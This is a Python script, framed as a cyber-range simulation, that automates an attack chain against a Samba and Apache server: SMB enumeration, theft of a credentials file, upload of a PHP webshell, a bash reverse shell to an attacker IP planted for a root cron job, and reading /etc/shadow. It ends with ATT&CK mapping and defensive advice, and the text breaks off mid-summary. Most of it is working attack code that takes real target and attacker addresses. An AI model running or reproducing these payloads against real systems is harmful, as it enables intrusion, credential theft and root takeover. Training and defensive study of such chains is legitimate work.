#!/usr/bin/env python3
"""
+======================================================================+
|        SambaCry (CVE-2017-7494) Attack Chain Simulation              |
|        Authorized Cyber Range Penetration Test Only                  |
+======================================================================+

Target: Samba with anonymous-writable SMB shares + Apache/PHP
Entry:  Anonymous SMB write to web-served share -> webshell RCE

Attack Chain:
  Phase 1 -> Reconnaissance         (port scan, SMB enumeration)
  Phase 2 -> SMB Share Enumeration   (share access, data exfiltration)
  Phase 3 -> Webshell Upload & RCE   (SMB write -> HTTP execute)
  Phase 4 -> Privilege Escalation    (cron-based root shell)
  Phase 5 -> Post-Exploitation       (root enumeration, data collection)
  Phase 6 -> Report & ATT&CK Mapping
"""

import subprocess
import sys
import os
import re
import time
import shutil
import signal
import socket
import threading
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

# -- rich --------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding
except ImportError:
    print("[*] Installing 'rich' library...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages",
                        "--quiet", "rich"], check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "rich"], check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[!] Cannot install 'rich'. Run: sudo bash attacker_setup/setup_sambacry.sh")
            sys.exit(1)
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding

console = Console()

# -- Global state ------------------------------------------------------------
STATE = {
    "attacker_ip": None,
    "victim_ip":   None,
    "shell_port":  4444,

    # Infrastructure process handles
    "listener_proc": None,

    # Loot
    "loot": {},
    "shell_received": False,

    "start_time": datetime.now(),
}

# -- MITRE ATT&CK ------------------------------------------------------------
MITRE = [
    ("Reconnaissance",        "T1595.002", "Active Scanning -- Vulnerability Scanning"),
    ("Reconnaissance",        "T1592.002", "Gather Victim Host Info -- Software"),
    ("Lateral Movement",      "T1021.002", "SMB/Windows Admin Shares"),
    ("Collection",            "T1039",     "Data from Network Shared Drive"),
    ("Persistence",           "T1505.003", "Server Software Component -- Web Shell"),
    ("Execution",             "T1059.004", "Command & Scripting Interpreter -- Unix Shell"),
    ("Execution",             "T1053.003", "Scheduled Task/Job -- Cron"),
    ("Privilege Escalation",  "T1068",     "Exploitation for Privilege Escalation"),
    ("Collection",            "T1005",     "Data from Local System"),
]

# ---------------------------------------------------------------------------
#  Helpers
# ---------------------------------------------------------------------------

def run(cmd: list, timeout: int = 90, stdin_data: str = None) -> tuple:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=stdin_data)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timed out"
    except FileNotFoundError as e:
        return -2, "", f"Tool not found: {e}"
    except Exception as e:
        return -3, "", str(e)


def check_port(ip: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# -- Pretty-print ------------------------------------------------------------

def phase_header(n: int, title: str, desc: str = ""):
    console.print()
    console.rule(f"[bold magenta]  PHASE {n} -- {title}  [/bold magenta]", style="magenta")
    if desc:
        console.print(f"  [dim]{desc}[/dim]")
    console.print()


def step(label: str, title: str):
    console.print(f"  [bold cyan]>> {label}[/bold cyan]  [white]{title}[/white]")


def ok(msg: str):
    console.print(f"    [bold green][+][/bold green]  {msg}")


def warn(msg: str):
    console.print(f"    [bold yellow][!][/bold yellow]  {msg}")


def err(msg: str):
    console.print(f"    [bold red][-][/bold red]  {msg}")


def info(msg: str):
    console.print(f"    [dim]->[/dim]  {msg}")


def cmd_display(cmd_str: str):
    console.print(f"    [dim yellow]$[/dim yellow]  [italic dim]{cmd_str}[/italic dim]")

# ---------------------------------------------------------------------------
#  Phase 0: Banner + Config
# ---------------------------------------------------------------------------

def banner():
    art = r"""
   _____                 __         ______
  / ___/____ _____ ___  / /_  ____ / ____/______  __
  \__ \/ __ `/ __ `__ \/ __ \/ __ / /   / ___/ / / /
 ___/ / /_/ / / / / / / /_/ / /_/ / /___/ /  / /_/ /
/____/\__,_/_/ /_/ /_/_.___/\__,_/\____/_/   \__, /
                  CVE-2017-7494             /____/
    """
    console.print(Panel(
        f"[bold red]{art}[/bold red]\n"
        "[bold white]SambaCry Attack Chain -- Full Kill Chain Simulation[/bold white]\n\n"
        "[dim]  Target:  Samba + Apache/PHP with anonymous-writable shares[/dim]\n"
        "[dim]  Vector:  SMB anonymous write -> webshell upload -> cron privesc[/dim]\n"
        "[dim]  Impact:  Unauthenticated RCE + Root Privilege Escalation[/dim]\n"
        f"[dim]  Started: {STATE['start_time'].strftime('%Y-%m-%d %H:%M:%S')}[/dim]",
        title="[bold red]SambaCry EXPLOITATION[/bold red]",
        border_style="red",
        padding=(1, 4),
    ))
    console.print()


def configure():
    console.print(Panel(
        "[bold]Enter target and attacker configuration.[/bold]\n\n"
        "The attacker IP must be reachable from the victim (for reverse shells).",
        title="[bold blue]Configuration[/bold blue]",
        border_style="blue",
    ))
    console.print()

    STATE["attacker_ip"] = Prompt.ask(
        "  [bold cyan]Attacker IP[/bold cyan] [dim](this machine)[/dim]",
        default="10.0.0.1",
    )
    STATE["victim_ip"] = Prompt.ask(
        "  [bold yellow]Victim IP[/bold yellow] [dim](Samba/Apache server)[/dim]",
        default="10.0.0.2",
    )
    STATE["shell_port"] = int(Prompt.ask("  [cyan]Reverse shell port[/cyan]", default="4444"))

    console.print()
    t = Table(title="Configuration", box=box.ROUNDED, border_style="blue")
    t.add_column("Parameter", style="cyan")
    t.add_column("Value", style="white")
    t.add_row("Attacker IP", STATE["attacker_ip"])
    t.add_row("Victim IP", STATE["victim_ip"])
    t.add_row("Reverse Shell Port", str(STATE["shell_port"]))
    console.print(Padding(t, (0, 2)))
    console.print()

    if not Confirm.ask("  [bold yellow]Launch attack simulation?[/bold yellow]", default=True):
        console.print("[red]Aborted.[/red]")
        sys.exit(0)

# ---------------------------------------------------------------------------
#  Phase 1: Reconnaissance
# ---------------------------------------------------------------------------

def phase_recon():
    phase_header(1, "RECONNAISSANCE",
                 "Port scanning, service fingerprinting, SMB enumeration")

    victim = STATE["victim_ip"]

    # 1.1 Tool check
    step("1.1", "Checking available tools")
    tools = {
        "nmap":      "Port scanner",
        "smbclient": "SMB client",
        "smbmap":    "SMB share mapper",
        "enum4linux": "SMB enumerator",
        "curl":      "HTTP client",
        "nc":        "Netcat (reverse shell listener)",
    }
    tt = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    tt.add_column("Tool", style="cyan", width=14)
    tt.add_column("Status", width=14)
    tt.add_column("Purpose", style="dim")
    missing_critical = []
    for name, purpose in tools.items():
        found = shutil.which(name) is not None
        status = "[bold green][+] Found[/bold green]" if found else "[red][-] Missing[/red]"
        tt.add_row(name, status, purpose)
        if not found and name in ("smbclient", "curl"):
            missing_critical.append(name)
    console.print(Padding(tt, (0, 4)))
    if missing_critical:
        warn(f"Missing critical tools: {', '.join(missing_critical)}")
        info("Install with: sudo apt install -y smbclient curl nmap")
    console.print()

    # 1.2 Port scan
    step("1.2", f"Port scanning {victim}")
    ports = "22,80,139,445"
    cmd_display(f"nmap -sV -p {ports} --open {victim}")
    if shutil.which("nmap"):
        rc, out, _ = run(["nmap", "-sV", f"-p{ports}", "--open", victim], timeout=120)
        open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", out)
        if open_ports:
            pt = Table(title=f"Open Ports -- {victim}", box=box.ROUNDED)
            pt.add_column("Port", style="bold yellow", width=8)
            pt.add_column("Service", style="cyan", width=14)
            pt.add_column("Version / Banner", style="white")
            for p, svc, ver in open_ports:
                pt.add_row(p, svc, ver.strip()[:60])
            console.print(Padding(pt, (0, 4)))
            ok(f"{len(open_ports)} open port(s) found")
            STATE["loot"]["open_ports"] = open_ports
        else:
            warn("No open ports detected -- check connectivity")
    else:
        warn("nmap not found, checking key ports directly")
        for p in [22, 80, 139, 445]:
            status = "[green]open[/green]" if check_port(victim, p) else "[red]closed[/red]"
            info(f"Port {p}: {status}")
    console.print()

    # 1.3 SMB enumeration -- smbclient -L
    step("1.3", f"SMB share listing via smbclient")
    cmd_display(f"smbclient -L //{victim}/ -N")
    if shutil.which("smbclient"):
        rc, out, stderr = run(["smbclient", "-L", f"//{victim}/", "-N"], timeout=30)
        combined = out + stderr
        if rc == 0 or "Sharename" in combined:
            shares = re.findall(r"^\s+(\S+)\s+Disk", combined, re.MULTILINE)
            if shares:
                st = Table(title="SMB Shares Discovered", box=box.ROUNDED)
                st.add_column("Share Name", style="bold yellow")
                st.add_column("Type", style="cyan")
                for s in shares:
                    st.add_row(s, "Disk")
                console.print(Padding(st, (0, 4)))
                ok(f"Found {len(shares)} disk share(s): {', '.join(shares)}")
                STATE["loot"]["smb_shares"] = shares
            else:
                warn("No disk shares found in output")
                info(f"Raw output: {combined[:300]}")
        else:
            warn(f"smbclient returned rc={rc}")
            info(f"stderr: {stderr[:200]}")
    else:
        warn("smbclient not found -- skipping SMB listing")
    console.print()

    # 1.4 SMB enumeration -- smbmap or enum4linux
    step("1.4", "SMB permission enumeration")
    if shutil.which("smbmap"):
        cmd_display(f"smbmap -H {victim}")
        rc, out, _ = run(["smbmap", "-H", victim], timeout=30)
        if rc == 0 and out.strip():
            for line in out.strip().splitlines():
                if "READ" in line or "WRITE" in line or "Disk" in line:
                    console.print(f"      [dim white]{line.strip()}[/dim white]")
            ok("Share permissions enumerated via smbmap")
        else:
            info("smbmap returned no useful output")
    elif shutil.which("enum4linux"):
        cmd_display(f"enum4linux -S {victim}")
        rc, out, _ = run(["enum4linux", "-S", victim], timeout=60)
        if rc == 0 and out.strip():
            for line in out.strip().splitlines():
                if "Mapping:" in line or "share" in line.lower():
                    console.print(f"      [dim white]{line.strip()}[/dim white]")
            ok("Share info enumerated via enum4linux")
    else:
        info("Neither smbmap nor enum4linux available -- share permissions not verified")
    console.print()

# ---------------------------------------------------------------------------
#  Phase 2: SMB Share Enumeration & Data Exfiltration
# ---------------------------------------------------------------------------

def phase_smb_exfil():
    phase_header(2, "SMB SHARE ENUMERATION & DATA EXFILTRATION",
                 "Access anonymous shares, download sensitive files")

    victim = STATE["victim_ip"]

    # 2.1 List files on 'data' share
    step("2.1", "Listing files on 'data' share")
    cmd_display(f"smbclient //{victim}/data -N -c 'ls'")
    if not shutil.which("smbclient"):
        err("smbclient not found -- cannot proceed with SMB operations")
        return

    rc, out, stderr = run(["smbclient", f"//{victim}/data", "-N", "-c", "ls"], timeout=30)
    combined = out + stderr
    if "internal_credentials.txt" in combined or rc == 0:
        file_lines = [l.strip() for l in combined.splitlines() if l.strip() and not l.strip().startswith("Try") and not l.strip().startswith("smb:")]
        for line in file_lines:
            if line and not line.startswith("session"):
                console.print(f"      [dim white]{line}[/dim white]")
        ok("Directory listing retrieved from 'data' share")
    else:
        warn(f"Could not list 'data' share (rc={rc})")
        info(f"Output: {combined[:200]}")
    console.print()

    # 2.2 Download internal_credentials.txt
    step("2.2", "Downloading internal_credentials.txt from 'data' share")
    local_creds = "/tmp/internal_credentials.txt"
    cmd_display(f"smbclient //{victim}/data -N -c 'get internal_credentials.txt {local_creds}'")
    rc, out, stderr = run(
        ["smbclient", f"//{victim}/data", "-N", "-c",
         f"get internal_credentials.txt {local_creds}"],
        timeout=30,
    )
    if os.path.exists(local_creds):
        ok(f"File downloaded to {local_creds}")
        STATE["loot"]["credentials_file"] = local_creds
    else:
        warn("Download may have failed -- checking alternative method")
        rc2, out2, _ = run(
            ["smbclient", f"//{victim}/data", "-N", "-c",
             "get internal_credentials.txt"],
            timeout=30,
        )
        if os.path.exists("internal_credentials.txt"):
            os.rename("internal_credentials.txt", local_creds)
            ok(f"File downloaded to {local_creds}")
            STATE["loot"]["credentials_file"] = local_creds
        else:
            err("Could not download credentials file")
            info(f"Output: {(out + stderr)[:200]}")
    console.print()

    # 2.3 Display stolen credentials
    step("2.3", "Displaying exfiltrated credentials")
    if os.path.exists(local_creds):
        try:
            creds_content = Path(local_creds).read_text()
        except Exception as e:
            creds_content = f"Error reading file: {e}"
        console.print(Panel(
            f"[bold white]{creds_content}[/bold white]",
            title="[bold red]STOLEN CREDENTIALS -- internal_credentials.txt[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
        STATE["loot"]["credentials_content"] = creds_content
        ok("[bold red]Sensitive credentials exfiltrated from anonymous SMB share[/bold red]")
    else:
        info("No credentials file to display")
    console.print()

    # 2.4 List files on 'www' share
    step("2.4", "Listing files on 'www' share (Apache document root)")
    cmd_display(f"smbclient //{victim}/www -N -c 'ls'")
    rc, out, stderr = run(["smbclient", f"//{victim}/www", "-N", "-c", "ls"], timeout=30)
    combined = out + stderr
    file_lines = [l.strip() for l in combined.splitlines() if l.strip() and not l.strip().startswith("Try") and not l.strip().startswith("smb:")]
    for line in file_lines:
        if line and not line.startswith("session"):
            console.print(f"      [dim white]{line}[/dim white]")
    ok("'www' share is accessible -- files are served by Apache on port 80")
    console.print()

# ---------------------------------------------------------------------------
#  Phase 3: Webshell Upload & RCE
# ---------------------------------------------------------------------------

def phase_webshell():
    phase_header(3, "WEBSHELL UPLOAD & RCE",
                 "Upload PHP webshell via SMB, execute commands via HTTP")

    victim = STATE["victim_ip"]

    if not shutil.which("smbclient"):
        err("smbclient not found -- cannot upload webshell")
        return

    # 3.1 Create PHP webshell
    step("3.1", "Creating PHP webshell payload")
    webshell_path = "/tmp/shell.php"
    webshell_content = '<?php system($_GET["cmd"]); ?>'
    Path(webshell_path).write_text(webshell_content)
    info(f"Webshell: [bold yellow]{webshell_content}[/bold yellow]")
    ok(f"Webshell written to {webshell_path}")
    console.print()

    # 3.2 Upload webshell to 'www' share via SMB
    step("3.2", "Uploading webshell to 'www' share via SMB")
    cmd_display(f"smbclient //{victim}/www -N -c 'put {webshell_path} shell.php'")
    rc, out, stderr = run(
        ["smbclient", f"//{victim}/www", "-N", "-c",
         f"put {webshell_path} shell.php"],
        timeout=30,
    )
    combined = out + stderr
    if rc == 0 or "putting file" in combined.lower():
        ok("Webshell uploaded to 'www' share as shell.php")
    else:
        err(f"Upload may have failed (rc={rc})")
        info(f"Output: {combined[:200]}")
    console.print()

    # 3.3 Verify webshell via HTTP
    step("3.3", "Verifying webshell accessibility via HTTP")
    webshell_url = f"http://{victim}/shell.php"
    cmd_display(f"curl -s -o /dev/null -w '%{{http_code}}' '{webshell_url}'")
    if shutil.which("curl"):
        rc, out, _ = run(
            ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", webshell_url],
            timeout=15,
        )
        if out.strip() == "200":
            ok(f"Webshell is accessible at [bold cyan]{webshell_url}[/bold cyan]")
        else:
            warn(f"HTTP status: {out.strip()} -- webshell may not be accessible yet")
            info("Apache may need a moment to detect the new file")
    else:
        warn("curl not found -- cannot verify webshell")
    console.print()

    # 3.4 Execute commands via webshell
    step("3.4", "Executing commands via webshell (RCE as www-data)")

    rce_commands = [
        ("id",           "User identity"),
        ("whoami",       "Current user"),
        ("uname -a",    "System information"),
        ("cat /etc/passwd", "System users"),
    ]

    rce_results = {}
    for cmd_str, desc in rce_commands:
        encoded_cmd = quote(cmd_str)
        url = f"http://{victim}/shell.php?cmd={encoded_cmd}"
        cmd_display(f'curl "http://{victim}/shell.php?cmd={cmd_str}"')

        if shutil.which("curl"):
            rc, out, _ = run(["curl", "-s", url], timeout=15)
            if rc == 0 and out.strip():
                rce_results[cmd_str] = out.strip()
                # Truncate long output for display
                display_lines = out.strip().splitlines()
                if len(display_lines) > 6:
                    for line in display_lines[:6]:
                        console.print(f"      [dim white]{line}[/dim white]")
                    console.print(f"      [dim]... ({len(display_lines) - 6} more lines)[/dim]")
                else:
                    for line in display_lines:
                        console.print(f"      [dim white]{line}[/dim white]")
            else:
                warn(f"No output for: {cmd_str}")
        console.print()

    if rce_results:
        STATE["loot"]["rce_results"] = rce_results

        console.print(Panel(
            f"[bold green]Remote Code Execution confirmed as www-data[/bold green]\n\n"
            f"  User:   [yellow]{rce_results.get('id', 'unknown')}[/yellow]\n"
            f"  System: [cyan]{rce_results.get('uname -a', 'unknown')[:80]}[/cyan]\n\n"
            f"  The attacker can execute arbitrary commands on the victim\n"
            f"  via the PHP webshell uploaded through the SMB share.",
            title="[bold red]REMOTE CODE EXECUTION ACHIEVED[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    else:
        warn("Could not confirm RCE -- commands returned no output")
    console.print()

# ---------------------------------------------------------------------------
#  Phase 4: Privilege Escalation
# ---------------------------------------------------------------------------

def phase_privesc():
    phase_header(4, "PRIVILEGE ESCALATION",
                 "Exploit root cron job via writable SMB share to obtain root shell")

    victim = STATE["victim_ip"]
    attacker = STATE["attacker_ip"]
    shell_port = STATE["shell_port"]

    if not shutil.which("smbclient"):
        err("smbclient not found -- cannot upload privilege escalation payload")
        return

    # 4.1 Explain the attack vector
    step("4.1", "Attack vector analysis")
    console.print(Panel(
        "  A root cron job on the victim executes any file matching\n"
        "  [bold yellow]/srv/samba/share/*.run.sh[/bold yellow] every minute.\n\n"
        "  Since the [bold]data[/bold] share maps to [cyan]/srv/samba/share[/cyan] and\n"
        "  allows anonymous write access, we can upload a reverse shell\n"
        "  script that will be executed as [bold red]root[/bold red].\n\n"
        "  This simulates the shared library loading mechanism in CVE-2017-7494,\n"
        "  where arbitrary code placed on a writable share gets executed by\n"
        "  a privileged process.",
        title="[bold yellow]Privilege Escalation Vector[/bold yellow]",
        border_style="yellow",
        padding=(1, 3),
    ))
    console.print()

    # 4.2 Create reverse shell payload
    step("4.2", "Creating reverse shell payload for root cron execution")
    privesc_path = "/tmp/privesc.run.sh"
    privesc_content = f"#!/bin/bash\nbash -i >& /dev/tcp/{attacker}/{shell_port} 0>&1\n"
    Path(privesc_path).write_text(privesc_content)
    os.chmod(privesc_path, 0o755)
    info(f"Payload: bash reverse shell -> {attacker}:{shell_port}")
    info(f"Filename: privesc.run.sh (matches *.run.sh cron pattern)")
    ok(f"Reverse shell script written to {privesc_path}")
    console.print()

    # 4.3 Upload to 'data' share
    step("4.3", "Uploading reverse shell to 'data' share via SMB")
    cmd_display(f"smbclient //{victim}/data -N -c 'put {privesc_path} privesc.run.sh'")
    rc, out, stderr = run(
        ["smbclient", f"//{victim}/data", "-N", "-c",
         f"put {privesc_path} privesc.run.sh"],
        timeout=30,
    )
    combined = out + stderr
    if rc == 0 or "putting file" in combined.lower():
        ok("Reverse shell script uploaded as privesc.run.sh to 'data' share")
    else:
        err(f"Upload may have failed (rc={rc})")
        info(f"Output: {combined[:200]}")
        return
    console.print()

    # 4.4 Start reverse shell listener
    step("4.4", f"Starting reverse shell listener on port {shell_port}")

    nc_bin = shutil.which("ncat") or shutil.which("nc")
    if not nc_bin:
        err("Neither ncat nor nc found -- cannot start listener")
        info("Start a listener manually: nc -lvnp {shell_port}")
        return

    # Kill any existing process on the shell port
    run(["fuser", "-k", f"{shell_port}/tcp"], timeout=5)
    time.sleep(0.5)

    cmd_display(f"nc -lvnp {shell_port}")
    listener_proc = subprocess.Popen(
        [nc_bin, "-lvnp", str(shell_port)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    STATE["listener_proc"] = listener_proc
    time.sleep(1)

    if listener_proc.poll() is not None:
        err("Listener failed to start -- port may be in use")
        return

    ok(f"Listener active on 0.0.0.0:{shell_port} (PID {listener_proc.pid})")
    console.print()

    # 4.5 Wait for root shell via cron execution
    step("4.5", "Waiting for root cron job to execute payload (up to 90 seconds)...")
    info("The cron job runs every minute -- shell should arrive within 60-90 seconds")
    console.print()

    shell_connected = False
    shell_event = threading.Event()

    def _monitor_connection():
        """Monitor for incoming connection on shell port."""
        for _ in range(90):
            if shell_event.is_set():
                return
            time.sleep(1)
            rc_check, out_check, _ = run(["ss", "-tnp", f"sport = :{shell_port}"], timeout=5)
            if "ESTAB" in out_check:
                shell_event.set()
                return

    monitor_thread = threading.Thread(target=_monitor_connection, daemon=True)
    monitor_thread.start()

    # Display countdown while waiting
    for i in range(90):
        if shell_event.is_set():
            break
        elapsed = i + 1
        console.print(f"    [dim]  Waiting for root shell... ({elapsed}s / 90s)[/dim]", end="\r")
        time.sleep(1)

    console.print(" " * 60, end="\r")  # clear the waiting line

    if shell_event.is_set():
        shell_connected = True
        ok("[bold green]ROOT REVERSE SHELL RECEIVED![/bold green]")
        STATE["shell_received"] = True

        console.print(Panel(
            f"[bold green]Root shell established on {victim}[/bold green]\n\n"
            f"  The root cron job executed [yellow]privesc.run.sh[/yellow] from the\n"
            f"  SMB share, sending a reverse shell to [cyan]{attacker}:{shell_port}[/cyan].\n\n"
            f"  The attacker now has [bold red]ROOT ACCESS[/bold red] on the target.",
            title="[bold red]ROOT ACCESS ACHIEVED[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    else:
        warn("Root shell not detected within 90 seconds")
        info(f"Check manually: the nc listener on port {shell_port} may have a shell")
        info("Verify the cron job is running: ssh into victim and check 'crontab -l'")
        STATE["shell_received"] = Confirm.ask("  Did you receive a root reverse shell?", default=False)

    console.print()

# ---------------------------------------------------------------------------
#  Phase 5: Post-Exploitation
# ---------------------------------------------------------------------------

def phase_post_exploit():
    phase_header(5, "POST-EXPLOITATION",
                 "Root system enumeration, shadow file access, flag retrieval")

    victim = STATE["victim_ip"]
    listener = STATE.get("listener_proc")

    if not STATE["shell_received"] or listener is None or listener.poll() is not None:
        info("No active root shell -- running post-exploitation via webshell fallback")
        _post_exploit_via_webshell()
        return

    # Run commands through the reverse shell
    def shell_exec(cmd: str, timeout: int = 10) -> str:
        try:
            listener.stdin.write(f"{cmd}\n".encode())
            listener.stdin.flush()
            time.sleep(2)
            import select
            output = ""
            while select.select([listener.stdout], [], [], 0.5)[0]:
                data = listener.stdout.read1(4096).decode(errors="replace")
                output += data
            return output
        except Exception as e:
            return f"Error: {e}"

    post_commands = [
        ("5.1", "Root Verification",    "id"),
        ("5.2", "Shadow File Access",   "cat /etc/shadow"),
        ("5.3", "Target Flag",          "cat /root/TARGET_INFO.txt"),
        ("5.4", "System Information",   "uname -a; hostname"),
        ("5.5", "Network Configuration", "ip addr show"),
    ]

    for label, title, cmd in post_commands:
        step(label, title)
        cmd_display(cmd)
        output = shell_exec(cmd)
        if output.strip():
            display_lines = output.strip().splitlines()
            if len(display_lines) > 10:
                for line in display_lines[:10]:
                    console.print(f"      [dim white]{line}[/dim white]")
                console.print(f"      [dim]... ({len(display_lines) - 10} more lines)[/dim]")
            else:
                for line in display_lines:
                    console.print(f"      [dim white]{line}[/dim white]")

            if cmd == "cat /etc/shadow":
                STATE["loot"]["shadow_file"] = output.strip()
            elif cmd == "cat /root/TARGET_INFO.txt":
                STATE["loot"]["target_flag"] = output.strip()
        console.print()

    STATE["loot"]["post_exploit"] = "completed"


def _post_exploit_via_webshell():
    """Fallback: run post-exploitation via the webshell if root shell is unavailable."""
    victim = STATE["victim_ip"]

    step("5.F", "Fallback: running post-exploitation via webshell (www-data)")
    info("Note: webshell runs as www-data, not root -- some commands may fail")
    console.print()

    if not shutil.which("curl"):
        err("curl not found -- cannot run webshell commands")
        return

    commands = [
        ("User Info",        "id"),
        ("System Info",      "uname -a"),
        ("Hostname",         "hostname"),
        ("Network",          "ip -br addr show"),
        ("Shadow File",      "cat /etc/shadow 2>&1 | head -5"),
        ("Target Flag",      "cat /root/TARGET_INFO.txt 2>&1"),
    ]

    for label, cmd in commands:
        info(f"[bold]{label}[/bold]")
        encoded_cmd = quote(cmd)
        url = f"http://{victim}/shell.php?cmd={encoded_cmd}"
        cmd_display(f'curl "http://{victim}/shell.php?cmd={cmd}"')
        rc, out, _ = run(["curl", "-s", url], timeout=15)
        if rc == 0 and out.strip():
            for line in out.strip().splitlines()[:8]:
                console.print(f"      [dim white]{line}[/dim white]")
            if "shadow" in cmd and "Permission denied" not in out:
                STATE["loot"]["shadow_file"] = out.strip()
            if "TARGET_INFO" in cmd and "Permission denied" not in out:
                STATE["loot"]["target_flag"] = out.strip()
        else:
            warn(f"No output or access denied for: {cmd}")
        console.print()

    STATE["loot"]["post_exploit"] = "webshell_fallback"

# ---------------------------------------------------------------------------
#  Phase 6: Report
# ---------------------------------------------------------------------------

def phase_report():
    phase_header(6, "OPERATION REPORT",
                 "Summary, ATT&CK mapping, defensive recommendations")

    duration = datetime.now() - STATE["start_time"]
    shares = STATE["loot"].get("smb_shares", [])
    creds_found = "credentials_content" in STATE["loot"]

    console.print(Panel(
        f"[bold]SambaCry Attack Simulation Complete[/bold]\n\n"
        f"  Duration           : {str(duration).split('.')[0]}\n"
        f"  Target             : [yellow]{STATE['victim_ip']}[/yellow]\n"
        f"  Services           : Samba (139/445), Apache/PHP (80)\n"
        f"  Vulnerability      : [bold red]CVE-2017-7494 (SambaCry) -- attack primitive[/bold red]\n"
        f"  SMB Shares Found   : [cyan]{', '.join(shares) if shares else 'N/A'}[/cyan]\n"
        f"  Credentials Stolen : {'[bold red]YES[/bold red]' if creds_found else '[yellow]NO[/yellow]'}\n"
        f"  Webshell RCE       : {'[bold red]YES (www-data)[/bold red]' if STATE['loot'].get('rce_results') else '[yellow]Not confirmed[/yellow]'}\n"
        f"  Root Shell         : {'[bold red]YES[/bold red]' if STATE['shell_received'] else '[yellow]Not obtained[/yellow]'}\n"
        f"  Shadow File        : {'[bold red]Exfiltrated[/bold red]' if STATE['loot'].get('shadow_file') else '[yellow]Not obtained[/yellow]'}\n"
        f"  Target Flag        : {'[bold red]Captured[/bold red]' if STATE['loot'].get('target_flag') else '[yellow]Not captured[/yellow]'}",
        title="[bold green][+]  OPERATION SUMMARY[/bold green]",
        border_style="bold green",
        padding=(1, 4),
    ))
    console.print()

    # Attack timeline
    console.rule("[bold blue]Attack Chain Timeline[/bold blue]", style="blue")
    tlt = Table(box=box.SIMPLE_HEAD)
    tlt.add_column("Phase", style="cyan", width=10)
    tlt.add_column("Name", style="white", width=32)
    tlt.add_column("Technique", style="dim")
    tlt.add_column("Result", width=10)
    timeline = [
        ("Phase 1", "Reconnaissance",              "nmap port scan + SMB enumeration"),
        ("Phase 2", "SMB Exfiltration",             "Anonymous share access + credential theft"),
        ("Phase 3", "Webshell Upload & RCE",        "SMB write shell.php -> HTTP execute"),
        ("Phase 4", "Privilege Escalation",         "Cron job executes uploaded .run.sh as root"),
        ("Phase 5", "Post-Exploitation",            "Root enum, shadow dump, flag capture"),
    ]
    for phase, name, detail in timeline:
        tlt.add_row(phase, name, detail, "[bold green][+][/bold green]")
    console.print(Padding(tlt, (0, 2)))
    console.print()

    # Kill chain diagram
    console.rule("[bold yellow]Kill Chain Flow[/bold yellow]", style="yellow")
    attacker = STATE["attacker_ip"]
    victim = STATE["victim_ip"]
    console.print(f"""
  [cyan]Attacker[/cyan] enumerates SMB shares on [yellow]{victim}[/yellow]
      |
      v
  [cyan]Attacker[/cyan] connects to [yellow]data[/yellow] share (anonymous, no password)
      |
      v
  [red]Exfiltrates[/red] internal_credentials.txt from share
      |
      v
  [cyan]Attacker[/cyan] uploads [yellow]shell.php[/yellow] to [yellow]www[/yellow] share via SMB
      |
      v
  [yellow]Apache[/yellow] serves shell.php on port 80
      |
      v
  [cyan]Attacker[/cyan] executes commands via [yellow]http://{victim}/shell.php?cmd=...[/yellow]
      |
      v
  [bold red]RCE as www-data[/bold red]
      |
      v
  [cyan]Attacker[/cyan] uploads [yellow]privesc.run.sh[/yellow] to [yellow]data[/yellow] share
      |
      v
  [yellow]Root cron job[/yellow] executes privesc.run.sh every minute
      |
      v
  [red]Reverse shell[/red] connects back to [cyan]{attacker}:{STATE['shell_port']}[/cyan]
      |
      v
  [bold red]FULL ROOT ACCESS[/bold red]
    """)

    # MITRE ATT&CK
    console.rule("[bold white]MITRE ATT&CK Coverage[/bold white]", style="white")
    mt = Table(box=box.SIMPLE, title="Techniques Used")
    mt.add_column("Tactic", style="magenta", width=22)
    mt.add_column("Technique ID", style="cyan", width=14)
    mt.add_column("Technique Name", style="white")
    for tactic, tid, name in MITRE:
        mt.add_row(tactic, tid, name)
    console.print(Padding(mt, (0, 2)))
    console.print()

    # Blue team recommendations
    console.rule("[bold green]Blue Team Defensive Recommendations[/bold green]", style="green")
    recs = [
        ("T1021.002", "Disable anonymous/guest SMB access -- require authentication for all shares"),
        ("T1021.002", "Restrict SMB share permissions -- use read-only where possible"),
        ("T1039",     "Do not store credentials in plaintext on network shares"),
        ("T1505.003", "Never serve SMB-writable directories via a web server (Apache/Nginx)"),
        ("T1505.003", "Disable PHP execution in upload directories via Apache configuration"),
        ("T1053.003", "Audit cron jobs -- never execute scripts from world-writable directories"),
        ("T1053.003", "Use inotifywait or file integrity monitoring on /srv/samba paths"),
        ("T1068",     "Apply principle of least privilege -- cron jobs should not run as root"),
        ("T1595.002", "Restrict SMB ports (139/445) to trusted networks only"),
        ("All",       "Keep Samba updated -- CVE-2017-7494 is patched in Samba >= 4.6.4"),
        ("All",       "Deploy network segmentation to isolate file servers from web servers"),
        ("All",       "Enable audit logging for SMB access and file creation events"),
    ]
    for tid, rec in recs:
        console.print(f"  [green]>[/green] [dim][{tid}][/dim] {rec}")
    console.print()

    # Final impact
    console.print(Panel(
        "[bold red]IMPACT SUMMARY[/bold red]\n\n"
        "  An [bold]unauthenticated[/bold] attacker achieved [bold red]full root compromise[/bold red]\n"
        "  through a chain of misconfigurations:\n\n"
        "  1. Anonymous SMB shares allowed credential theft and file upload\n"
        "  2. Apache serving an SMB-writable directory enabled webshell deployment\n"
